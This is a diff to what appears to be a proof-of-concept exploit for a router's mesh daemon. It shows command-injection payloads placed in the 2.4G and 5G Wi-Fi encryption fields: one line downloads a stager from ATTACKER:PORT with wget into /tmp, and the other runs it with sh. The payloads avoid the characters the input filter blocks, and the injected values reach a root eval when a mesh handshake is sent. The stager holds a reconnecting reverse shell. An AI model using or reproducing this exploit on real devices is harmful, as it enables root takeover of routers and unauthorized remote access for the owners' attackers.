@@ -21,11 +21,15 @@ The attack has three phases:
     restarting the radios, so the Wi-Fi stays up):
       2.4G encryption = '" wget http://ATTACKER:PORT/s -O /tmp/x #'  (fetch)
       5G   encryption = '" sh /tmp/x #'                               (exec)
-    hackCheck exempts encryption (a password-like field) from input
-    sanitization, so " and # survive into UCI unfiltered.
+    encryption passes through hackCheck. These payloads avoid its blocked bytes
+    (backtick, semicolon, pipe, dollar, ampersand, and newline) and use permitted
+    backslash-quote, spaces, and #. Hardware read-back confirmed that both values
+    reached UCI verbatim.
 
   Phase C — Trigger.
-    Send the type-4 → type-5 → type-7 mesh handshake. type-7 drives
+    Open a new cab_meshd connection and send the tested type-4 → type-5 → type-7
+    exchange. The type-7 handler has no connection-state comparison, but this PoC
+    retains the full validated sequence. type-7 drives
     cap_init, which reads the poisoned encryption values via `uci get` and
     feeds them through mimesh_init.sh:717's `eval` as root. The \" breaks out
     of the JSON double-quote in the eval context; the trailing # comments out
@@ -386,7 +390,7 @@ DEFAULT_STAGER = textwrap.dedent("""\
         [ "$changed" = 1 ] && {{ uci -q commit wireless; wifi reload; }}
       done
     ) &
-    # persistent reconnecting reverse shell (after self-repair settles)
+    # process-lifetime reconnecting reverse shell (after self-repair settles)
     (
       sleep 40
       while true; do
